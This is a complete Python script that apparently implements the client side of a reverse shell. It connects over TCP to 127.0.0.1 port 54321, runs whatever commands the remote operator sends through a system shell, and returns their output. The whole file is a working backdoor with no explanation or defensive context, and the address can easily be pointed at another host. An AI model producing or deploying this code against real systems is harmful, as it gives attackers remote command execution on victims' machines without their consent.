#!/usr/bin/python
import socket
import subprocess
import json

def reliable_send(data):
        json_data = json.dumps(data).encode()
        sock.send(json_data)

def reliable_recv():
        json_data = b""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

def shell():
        while True:
                command = reliable_recv()
                if command == "q":
                        break
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)

                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result.decode())
                        except:
                                reliable_send("[!!] Cant Execute That Command")

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 54321))
print("Connection Established To Server")
shell()
sock.close()
